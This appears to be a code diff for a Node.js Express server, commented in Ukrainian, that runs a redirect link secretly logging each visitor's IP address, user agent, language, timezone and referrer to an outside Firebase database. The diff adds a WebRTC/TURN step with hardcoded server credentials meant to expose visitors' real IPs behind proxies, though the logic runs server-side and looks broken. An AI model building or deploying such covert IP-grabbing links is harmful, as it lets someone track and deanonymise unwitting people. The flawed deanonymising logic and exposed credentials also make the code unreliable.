@@ -1,38 +1,63 @@
 const express = require('express');
 const fetch = require('node-fetch');
 const bodyParser = require('body-parser');
+const wrtc = require('wrtc');
 
 const app = express();
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-// Маршрут для збору часового поясу і реферера
+const iceConfiguration = {
+    iceServers: [
+        {
+            urls: ["turn:18.216.50.200:3478"], // явно вказуємо порт
+            username: "Anton",
+            credential: "ade37e9f18e7c174dd248cd132cbca8db75d84b3bfb858653b8536c30b3fd015"
+        }
+    ]
+};
+
 app.post('/capture-info', async (req, res) => {
     const { timeZone, referrer } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
     const language = req.headers['accept-language'];
     let dateTime = new Date().toISOString().replace(/[^0-9]/g, "").slice(2,12);
 
-    // Відправка даних до Firebase
-    const response = await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            ip: ip,
-            userAgent: userAgent,
-            language: language,
-            timeZone: timeZone,
-            referrer: referrer
-        }),
-    }).catch(err => {
-        res.status(500).send("Error: " + err);
-    });
+    // Створення WebRTC з'єднання
+    const pc = new wrtc.RTCPeerConnection(iceConfiguration);
 
-    res.status(200).send('Info captured');
+    pc.onicecandidate = async (event) => {
+        if (event.candidate) {
+            // Якщо це ваш TURN сервер, то отримана IP адреса є реальним IP користувача
+            let match = /relay\sip\s([0-9.]+)/.exec(event.candidate.candidate);
+            if (match) {
+                let realIP = match[1];
+                pc.close(); // Розриваємо з'єднання
+
+                // Зберігаємо дані в Firebase
+                await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: ipFromHeaders,
+						realip: realIP,
+                        userAgent: userAgent,
+                        language: language,
+                        timeZone: timeZone,
+                        referrer: referrer
+                    }),
+                });
+                
+                res.status(200).send('Info captured');
+            }
+        }
+    };
+
+    pc.createDataChannel(''); 
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
 });
 
-// GET маршрут для редіректу
 app.get('/relink', (req, res) => {
     if (req.query.url) {
         res.sendFile(__dirname + '/public/index.html');
